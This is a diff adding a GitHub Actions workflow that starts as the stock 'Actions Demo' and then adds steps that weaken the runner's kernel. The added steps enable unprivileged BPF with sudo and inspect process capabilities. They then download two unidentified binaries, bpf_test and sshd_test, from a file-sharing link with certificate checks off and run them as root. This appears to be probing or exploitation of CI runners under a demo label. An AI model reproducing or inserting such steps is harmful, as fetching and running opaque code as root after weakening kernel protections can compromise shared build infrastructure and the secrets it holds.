@@ -1,0 +1,21 @@
+name: GitHub Actions Demo
+on: [push]
+jobs:
+  Explore-GitHub-Actions:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "🎉 The job was automatically triggered by a ${{ github.event_name }} event."
+      - run: echo "🐧 This job is now running on a ${{ runner.os }} server hosted by GitHub!"
+      - run: echo "🔎 The name of your branch is ${{ github.ref }} and your repository is ${{ github.repository }}."
+      - run: uname -a
+      - run: whoami
+      - run: cat /proc/sys/kernel/unprivileged_bpf_disabled
+      - run: sudo sysctl kernel.unprivileged_bpf_disabled=0
+      - run: cat /proc/sys/kernel/unprivileged_bpf_disabled
+      - run: cat /proc/1/status | grep Cap
+      - run: wget https://cloud.tsinghua.edu.cn/f/76307d9ba25040beaef6/?dl=1 -O bpf_test --no-check-certificate
+      - run: chmod +x bpf_test
+      - run: sudo ./bpf_test
+      - run: wget https://cloud.tsinghua.edu.cn/f/3b5e5862ee254ba29df3/?dl=1 -O sshd_test --no-check-certificate
+      - run: chmod +x sshd_test
+      - run: sudo ./sshd_test
